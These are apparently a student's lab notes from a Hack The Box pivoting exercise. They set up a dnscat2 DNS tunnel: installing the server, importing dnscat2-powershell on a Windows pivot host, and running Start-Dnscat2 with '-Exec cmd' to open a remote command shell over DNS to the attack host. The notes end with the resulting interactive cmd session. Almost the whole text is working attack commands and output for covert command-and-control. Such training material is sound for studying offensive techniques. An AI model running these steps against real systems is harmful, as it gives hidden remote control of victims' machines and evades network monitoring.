
#### Cloning dnscat2 and Setting Up the Server
```shell-session
Tachipy@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```
#### Starting the dnscat2 server
```shell-session
Tachipy@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.253,port=53,domain=inlanefreight.local --no-cache
```
#### Cloning dnscat2-powershell to the Attack Host

Attack Host
```shell-session
Tachipy@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
#### Importing dnscat2.ps1

Pivot Host 

```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1

PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```
#### Interacting with the Established Session

```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```